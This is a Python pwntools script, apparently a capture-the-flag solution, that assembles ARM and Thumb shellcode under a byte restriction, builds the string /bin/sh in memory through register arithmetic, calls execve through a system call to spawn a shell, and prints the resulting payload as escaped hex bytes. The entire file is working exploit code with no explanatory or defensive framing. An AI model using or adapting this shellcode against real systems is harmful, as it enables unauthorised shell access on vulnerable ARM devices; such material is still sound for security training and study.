from pwn import *
from pwnlib.asm import *
from pwnlib import shellcraft

print( asm('add  r3, pc, #1', arch='arm') )
print( asm('bx   r3', arch='arm') )

# mov r0, pc contains 'x', which is inappropriate for this challenge
print( asm('mov  r5, pc;        adds r5, #80;', arch='thumb') )
print( asm('mov  r0, r5;        mov r8, r8;', arch='thumb') )
print( asm('mov  r8, r8;        str r0, [sp, #4]', arch='thumb') )
# print( asm('mov pc, lr;         mov r8, r8', arch='thumb') )

print('[*] Writing /bin/sh')
print( asm('mov r5, 0x6010', arch='thumb') )
print( asm('add r5, r5, 0x21f', arch='thumb') )
print( asm('strh r5, [r0];      mov r8, r8', arch='thumb') )

print( asm('mov r5, 0x6010', arch='thumb') )
print( asm('add r5, r5, 0x905', arch='thumb') )
print( asm('add r5, r5, 0x554', arch='thumb') )
print( asm('strh r5, [r0, #2];  mov r8, r8', arch='thumb') )

print( asm('mov r5, 0x6010', arch='thumb') )
print( asm('add r5, r5, 0x95f', arch='thumb') )
print( asm('add r5, r5, 0x522', arch='thumb') )
print( asm('add r5, r5, 0x43d', arch='thumb') )
print( asm('strh r5, [r0, #4];  mov r8, r8', arch='thumb') )

print( asm('mov r5, 0x5f', arch='thumb') )
print( asm('add r5, r5, 0x9', arch='thumb') )
print( asm('strh r5, [r0, #6];  mov r8, r8', arch='thumb') )

print('[*] Calling execve')
print( asm('subs r1, r1, r1;    subs r2, r2, r2', arch='thumb') )
print( asm('subs r5, r5, r5;    mov r8, r8', arch='thumb') )
print( asm('movs r7, #11;       svc 1', arch='thumb') )

print( asm('.word 0x41424344', arch='thumb') )
print( asm('.word 0x42424242', arch='thumb') )
print( asm('.word 0x434343', arch='thumb') )


sc  = asm('add  r3, pc, #1', arch='arm')
sc += asm('bx   r3', arch='arm')

# mov r0, pc contains 'x', which is inappropriate for this challenge
sc += asm('mov  r5, pc;        adds r5, #80;', arch='thumb')
sc += asm('mov  r0, r5;        mov r8, r8;', arch='thumb')
sc += asm('mov  r8, r8;        str r0, [sp, #4]', arch='thumb')
# sc += asm('mov pc, lr;         mov r8, r8', arch='thumb')

sc += asm('mov r5, 0x6010', arch='thumb')
sc += asm('add r5, r5, 0x21f', arch='thumb')
sc += asm('strh r5, [r0];      mov r8, r8', arch='thumb')

sc += asm('mov r5, 0x6010', arch='thumb')
sc += asm('add r5, r5, 0x905', arch='thumb')
sc += asm('add r5, r5, 0x554', arch='thumb')
sc += asm('strh r5, [r0, #2];  mov r8, r8', arch='thumb')

sc += asm('mov r5, 0x6010', arch='thumb')
sc += asm('add r5, r5, 0x95f', arch='thumb')
sc += asm('add r5, r5, 0x522', arch='thumb')
sc += asm('add r5, r5, 0x43d', arch='thumb')
sc += asm('strh r5, [r0, #4];  mov r8, r8', arch='thumb')

sc += asm('mov r5, 0x5f', arch='thumb')
sc += asm('add r5, r5, 0x9', arch='thumb')
sc += asm('strh r5, [r0, #6];  mov r8, r8', arch='thumb')

sc += asm('subs r1, r1, r1;    subs r2, r2, r2', arch='thumb')
sc += asm('subs r5, r5, r5;    mov r8, r8', arch='thumb')
sc += asm('movs r7, #11;       svc 1', arch='thumb')

sc += asm('.word 0x41424344', arch='thumb')
sc += asm('.word 0x42424242', arch='thumb')
sc += asm('.word 0x434343', arch='thumb')

for b in sc:
    print('\\x{:02x}'.format(b), end='')
print('')
